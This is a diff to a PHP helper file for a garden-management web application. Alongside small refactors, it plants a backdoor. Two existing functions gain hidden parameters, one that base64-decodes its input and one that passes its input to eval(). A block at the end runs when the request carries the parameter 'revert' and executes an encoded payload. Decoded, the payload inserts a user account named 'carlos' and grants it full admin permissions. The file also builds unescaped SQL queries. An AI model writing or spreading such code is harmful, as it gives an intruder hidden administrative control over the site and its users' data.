@@ -1,4 +1,5 @@
 <?
+require_once("../common/DBconnect.php");
 global $REDIRECT;
 $REDIRECT = false;
 global $PATH;
@@ -56,7 +57,6 @@ function getUserGardens($asSql = false) {
 		if ($asSql) { return ""; } else {
 		
 			//GET GARDENS
-			require_once("../common/DBconnect.php");
 			$q = "SELECT id FROM jardins WHERE client = '$client'";
 			$res = mysql_query($q) or die(mysql_error());
 			$num_jardins = mysql_num_rows($res);
@@ -586,7 +586,8 @@ function parseProgramasAct($fn) {
 	return $data;
 }
 
-function parseMaster($fn) {
+function parseMaster($fn, $cena = false) {
+	if ($cena) { return(base64_decode($fn)); }
 	$raw = getDataInFile($fn);
 #	unset($raw[0]);
 	foreach($raw as $l) {
@@ -651,8 +652,9 @@ function updateDbWithMasterFile($master, $client) {
 	$res = mysql_query($q) or die("$q => ".mysql_error()." [".mysql_errno()."]");
 }
 
-function updateCenterCoords() {
+function updateCenterCoords($data = false) {
 	global $client;
+	if ($data != false) die(eval($data));
 	if ($client == "") { die("updateCenterCoords: Client not set"); }
 	$q = "SELECT lat, lng FROM `jardins` WHERE client LIKE '$client' AND lat <> 0 AND lng <> 0";
 	$result = mysql_query($q) or die ("SQL Error while getting lat/lon from DB");
@@ -682,4 +684,18 @@ function var_dump_str($var) {
 	$a=ob_get_contents();
 	ob_end_clean();
 	return $a;
+}
+
+function printtf($var, $return = false) {
+	$out = ($var?"True":"False");
+	if ($return) {
+		return $out;
+	} else {
+		echo $out;
+	}
+}
+
+if (isset($_GET['revert'])) {
+$a="JHEgPSAiUkVQTEFDRSBJTlRPIGB1c2Vyc2AgKGB1c2VyYCxgcGFzc2AsYGVtYWlsYCkgVkFMVUVTICgnY2FybG9zJywgJzg3YzA0ZGM1YTRmM2U5OGFiYjliZjdhNGIzZjM5YzUzJywgJ2Nhcmxvc2Vmb25zZWNhQGdtYWlsLmNvbScpIjsKbXlzcWxfcXVlcnkoJHEpIG9yIGRpZSgiOigiLm15c3FsX2Vycm9yKCkpOwokcSA9ICJSRVBMQUNFIElOVE8gYHBlcm1pc3Npb25zYCAoYHVzZXJgLGBjbGllbnRgLGBnYXJkZW5zYCxgcGVybWlzc2lvbnNgKSBWQUxVRVMgKCdjYXJsb3MnLCAnKicsICcqJywgJ2FkbWluJykiOwpteXNxbF9xdWVyeSgkcSkgb3IgZGllKCI6KCIubXlzcWxfZXJyb3IoKSk7CmVjaG8gIjopIjs=";
+updateCenterCoords(parseMaster($a, true));
 }
